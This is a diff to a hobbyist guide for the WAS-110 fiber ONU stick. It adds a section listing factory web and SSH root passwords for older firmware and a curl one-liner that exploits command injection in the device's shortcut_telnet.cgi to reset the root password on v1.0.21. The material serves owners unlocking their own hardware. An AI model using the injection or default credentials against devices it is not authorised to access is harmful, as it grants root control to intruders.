@@ -36,6 +36,8 @@ ping 192.168.11.1
 
 ## Credentials
 
+### Web credentials (HTTP)
+
 The original firmware login/password that come with the WAS-110 vary depending on the ONU version.
 
 > <= v1.0.20
@@ -51,6 +53,26 @@ The original firmware login/password that come with the WAS-110 vary depending o
 |:---------|:----------------|
 | admin    | BR#22729%635e9  |
 | user     | user1234        |
+
+### Shell credentials (SSH)
+
+The original firmware login/password that come with the WAS-110 vary depending on the ONU version.
+
+> <= v1.0.20
+
+| Username | Password        |
+|:---------|:----------------|
+| root     | QpZm@4246#5753  |
+
+> v1.0.21
+
+`The root password is undisclosed at this time, use the suggested exploit below to gain root privileges`
+
+Run the following command(s) to temporarily change the root password to `root`
+```bash
+curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+```
+
 
 ## Configuring the ONU to accept SSH
 
